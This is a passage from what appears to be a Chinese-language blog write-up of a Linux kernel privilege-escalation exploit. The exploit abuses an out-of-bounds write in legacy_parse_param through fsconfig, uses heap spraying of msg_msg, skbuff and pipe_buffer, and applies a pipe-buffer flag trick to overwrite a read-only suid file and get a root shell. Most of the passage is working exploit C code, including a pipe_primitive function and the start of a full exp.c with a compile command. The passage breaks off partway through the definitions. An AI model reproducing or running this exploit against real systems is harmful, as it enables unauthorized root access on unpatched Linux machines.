    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"trigger oob write in `legacy_parse_param` to corrupt messageA's "</span>
           <span class="token string">"msg_msg.m_ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>buff<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> <span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span> <span class="token comment">// append '=\x00'</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"searching corrupted msg_msg for freeing fake msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fake_msqid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0x100</span> <span class="token operator">&amp;&amp;</span> msg_a<span class="token operator">-></span>mtype <span class="token operator">==</span> MTYPE_FAKE<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      fake_msqid <span class="token operator">=</span> msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"fake_msqid = %d"</span><span class="token punctuation">,</span> fake_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fake_msqid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">fake_msg_msg_at_kmalloc_1024</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">create_uaf</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"retry create_uaf()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe_primitive"></a>pipe_primitive</h3><p>此时，通过 corrupted_msg_msg（即 fake_msqid）释放 kmalloc_1024 堆块，然后喷射 pipe_buffer 占位，同时调用 splice 把目标文件缓存页接入 pipe_buffer</p>
<p>利用 skb 修改文件缓存页对应的 pipe_buffer 的 flags 为 PIPE_BUF_FLAG_CAN_MERGE，向 pipe 写入数据即可成功修改只有读权限的 suid 程序文件</p>
<p>通过覆盖 suid 程序文件为恶意代码，执行恶意代码 getshell 提权：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">pipe_primitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"open target file %s"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>tfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>ATTACK_FILE<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"failed to open target file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"freeing fake msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>fake_msqid<span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> MTYPE_FAKE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgrcv() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"Alloc pipe failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">loff_t</span> offset <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token class-name">ssize_t</span> nbytes <span class="token operator">=</span> <span class="token function">splice</span><span class="token punctuation">(</span>tfd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>offset<span class="token punctuation">,</span> pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nbytes <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"splice() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"free skbuff_data to make pipe_buffer become UAF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> uaf_pipe_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> backup_skb<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> PIPE_BUF_FLAG_CAN_MERGE <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sock_pairs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"read from sock pairs failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>skb<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>pb<span class="token operator">-></span>len <span class="token operator">>=</span> <span class="token number">0x100</span> <span class="token operator">&amp;&amp;</span> pb<span class="token operator">-></span>len <span class="token operator">&lt;</span> <span class="token number">0x100</span> <span class="token operator">+</span> NUM_PIPEFDS<span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        uaf_pipe_idx <span class="token operator">=</span> pb<span class="token operator">-></span>len <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
        <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"uaf_pipe_idx = %d"</span><span class="token punctuation">,</span> uaf_pipe_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">,</span> skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>uaf_pipe_idx <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"uaf_pipe_idx not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"edit pipe_buffer->flags"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>pb <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>backup_skb<span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> PIPE_BUF_FLAG_CAN_MERGE<span class="token punctuation">;</span>
  pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ops <span class="token operator">=</span> pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ops<span class="token punctuation">;</span>
  <span class="token function">spray_skbuff_data</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>backup_skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"try to overwrite %s, by pipe fd %d"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">,</span>
           pipe_fd<span class="token punctuation">[</span>uaf_pipe_idx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>uaf_pipe_idx<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> attack_data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attack_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span>
      <span class="token keyword">sizeof</span><span class="token punctuation">(</span>attack_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"see if %s changed"</span><span class="token punctuation">,</span> ATTACK_FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>tfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  tfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>ATTACK_FILE<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>tfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"open attack file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">char</span> tmp_buffer<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>tfd<span class="token punctuation">,</span> tmp_buffer<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tmp_buffer <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0x56565656</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"overwrite attack file failed: 0x%08x"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -static -o exp exp.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/msg.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsconfig</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsconfig</span> <span class="token expression"><span class="token number">431</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsopen</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsopen</span> <span class="token expression"><span class="token number">430</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FSCONFIG_SET_STRING</span> <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">fsopen</span><span class="token expression"><span class="token punctuation">(</span>name<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsopen<span class="token punctuation">,</span> name<span class="token punctuation">,</span> flags<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">fsconfig</span><span class="token expression"><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> aux<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> aux<span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_SOCKETS</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_SKBUFFS</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_MSQIDS_1</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_MSQIDS_2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_PIPEFDS</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SKB_SHARED_INFO_SIZE</span> <span class="token expression"><span class="token number">0x140</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_A_TEXT_SIZE</span> <span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x1000</span> <span class="token operator">+</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_A</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_B1</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x42</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_B2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x43</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_FAKE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x45</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_TAG</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">0xdeadaaaa</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ATTACK_FILE</span> <span class="token string">"/suid-test"</span></span>

